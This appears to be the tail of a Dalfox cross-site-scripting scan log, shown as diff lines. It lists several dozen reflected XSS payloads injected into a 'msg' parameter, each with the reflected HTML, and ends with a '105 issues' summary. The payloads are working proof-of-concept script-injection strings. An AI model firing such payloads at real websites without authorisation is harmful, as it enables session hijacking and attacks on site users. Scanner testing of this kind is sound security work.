+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></text
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=alert.bind()(1)>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=alert.bind()(1)></textarea>
+[W] Reflected Payload in HTML: msg="><d3"<"/onclick=">[confirm``]"<">z
+    2 line:  extarea name="msg">a"><d3"<"/onclick=">[confirm``]"<">z</textarea></form>
+[W] Reflected Payload in HTML: msg=<iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+    2 line:  extarea name="msg">a<iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=alert(1)>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=alert(1)></textarea></form>
+[W] Reflected Payload in HTML: msg="><Svg/onload=alert(1) class=dlafox>
+    2 line:  extarea name="msg">a"><Svg/onload=alert(1) class=dlafox></textarea></form>
+[W] Reflected Payload in HTML: msg='"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+    2 line:  extarea name="msg">a'"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#
+[W] Reflected Payload in HTML: msg=<ScRipt class=dalfox>confirm(1)</script>
+    2 line:  extarea name="msg">a<ScRipt class=dalfox>confirm(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg=<ScRipt class=dalfox>alert(1)</script>
+    2 line:  extarea name="msg">a<ScRipt class=dalfox>alert(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg=<ScRipt class=dalfox>alert.bind()(1)</script>
+    2 line:  extarea name="msg">a<ScRipt class=dalfox>alert.bind()(1)</script></textarea></fo
+[W] Reflected Payload in HTML: msg=<sVg/onload=prompt(1) class=dalfox>
+    2 line:  extarea name="msg">a<sVg/onload=prompt(1) class=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg=<audio controls ondurationchange=confirm(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    2 line:  extarea name="msg">a<audio controls ondurationchange=confirm(1) id=dalfox><sourc
+[W] Reflected Payload in HTML: msg=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>
+    2 line:  extarea name="msg">a<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()></textarea></f
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:print(1)></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:print(1)></iFramE></textarea></form>
+[W] Reflected Payload in HTML: msg="><iFrAme/src=jaVascRipt:alert(1)></iFramE>
+    2 line:  extarea name="msg">a"><iFrAme/src=jaVascRipt:alert(1)></iFramE></textarea></form
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:prompt(1)></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:prompt(1)></iFramE></textarea></form>
+[W] Reflected Payload in HTML: msg='><sVg/onload=alert(1) class=dalfox>
+    2 line:  extarea name="msg">a'><sVg/onload=alert(1) class=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg="><d3"<"/onclick=" class=dalfox>[confirm``]"<">z
+    2 line:  extarea name="msg">a"><d3"<"/onclick=" class=dalfox>[confirm``]"<">z</textarea><
+[W] Reflected Payload in HTML: msg=<sVg/onload=alert.bind()(1)>
+    2 line:  <form><textarea name="msg">a<sVg/onload=alert.bind()(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt.valueOf()(1)></menu></div>
+    2 line:  extarea name="msg">a<div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[W] Reflected Payload in HTML: msg=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt(1)></menu></div>
+    2 line:  extarea name="msg">a<div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE></textarea><
+[W] Reflected Payload in HTML: msg=<ScRipt>print(1)</script>
+    2 line:  <form><textarea name="msg">a<ScRipt>print(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg=<audio controls ondurationchange=alert.bind()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    2 line:  extarea name="msg">a<audio controls ondurationchange=alert.bind()(1) id=dalfox><
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=print(1)>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=print(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=alert(1)>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=alert(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=dalfox>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=d
+[W] Reflected Payload in HTML: msg=<audio controls ondurationchange=prompt.valueOf()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    2 line:  extarea name="msg">a<audio controls ondurationchange=prompt.valueOf()(1) id=dalf
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=alert(1) class=dalfox>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=alert(1) class=dalfox></tex
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:alert(1)></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:alert(1)></iFramE></textarea></form>
+[W] Reflected Payload in HTML: msg='><a href=javas&#99;ript:alert(1)/class=dalfox>click
+    2 line:  extarea name="msg">a'><a href=javas&#99;ript:alert(1)/class=dalfox>click</textar
+[W] Reflected Payload in HTML: msg=<ScRipt class=dalfox>print(1)</script>
+    2 line:  extarea name="msg">a<ScRipt class=dalfox>print(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg="><a href="javascript&colon;alert(1)">click
+    2 line:  extarea name="msg">a"><a href="javascript&colon;alert(1)">click</textarea></form
+[W] Reflected Payload in HTML: msg=">asd
+    2 line:  <form><textarea name="msg">a">asd</textarea></form>
+[W] Reflected Payload in HTML: msg='><svg/class='dalfox'onLoad=alert(1)>
+    2 line:  extarea name="msg">a'><svg/class='dalfox'onLoad=alert(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox></t
+[W] Reflected Payload in HTML: msg='><sVg/onload=alert(1) id=dalfox>
+    2 line:  <form><textarea name="msg">a'><sVg/onload=alert(1) id=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg=<sVg/onload=alert(1) class=dalfox>
+    2 line:  <form><textarea name="msg">a<sVg/onload=alert(1) class=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg=<audio controls ondurationchange=alert(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    2 line:  extarea name="msg">a<audio controls ondurationchange=alert(1) id=dalfox><source 
+[W] Reflected Payload in HTML: msg=<iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox></iframe>
+    2 line:  extarea name="msg">a<iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox><
+[W] Reflected Payload in HTML: msg="><SvG/onload=alert(1) id=dalfox>
+    2 line:  <form><textarea name="msg">a"><SvG/onload=alert(1) id=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg="><img/src/onerror=.1|alert`` class=dalfox>
+    2 line:  extarea name="msg">a"><img/src/onerror=.1|alert`` class=dalfox></textarea></form
+[W] Reflected Payload in HTML: msg=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=confirm(1)></menu></div>
+    2 line:  extarea name="msg">a<div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[W] Reflected Payload in HTML: msg=<sVg/onload=alert(1)>
+    2 line:  <form><textarea name="msg">a<sVg/onload=alert(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox></te
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=confirm(1)>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=confirm(1)></textarea></for
+[W] Reflected Payload in HTML: msg=<audio controls ondurationchange=print(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    2 line:  extarea name="msg">a<audio controls ondurationchange=print(1) id=dalfox><source 
+[*] [duration: 4.35959605s][issues: 105] Finish Scan!
